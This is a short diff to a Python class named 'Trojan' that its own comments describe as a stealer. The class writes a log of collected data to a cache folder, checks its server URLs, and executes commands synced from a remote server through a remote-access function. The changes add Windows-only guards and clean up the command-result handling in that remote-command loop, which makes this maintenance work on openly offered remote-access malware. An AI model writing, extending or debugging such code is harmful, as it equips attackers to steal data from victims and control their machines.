@@ -388,6 +388,10 @@ class Trojan:
         :return: [None] Not returns any.
         """
 
+        if self.get_operation_system() != "Windows":
+            # If not windows - error.
+            return self.show_debug_message("Unsupported operating system, FILE error!")
+
         # Checking server UP.
         self.check_server_urls()
 
@@ -423,6 +427,10 @@ class Trojan:
         Creates log of the stealer, by creating an file in cache directory.
         :return: [None] Not returns any.
         """
+
+        if self.get_operation_system() != "Windows":
+            # If not windows - error.
+            return self.show_debug_message("Unsupported operating system, FILE error!")
 
         # Getting filename.
         filename = self.__setting_cache_folder + "\\Data\\log.json"
@@ -482,14 +490,9 @@ class Trojan:
                 # For every command in synced commands.
 
                 # Run this command.
-
-                # Command result.
-                command_result = ""
-
-                # Showing debug message.
                 try:
                     # Getting command result.
-                    command_result = command_result = ["SUCCESS", self.remote_access_execute_command(command)]
+                    command_result = ["SUCCESS", self.remote_access_execute_command(command)]
                 except Exception as error:  # noqa
                     # Getting command result.
                     command_result = ["ERROR", str(error)]
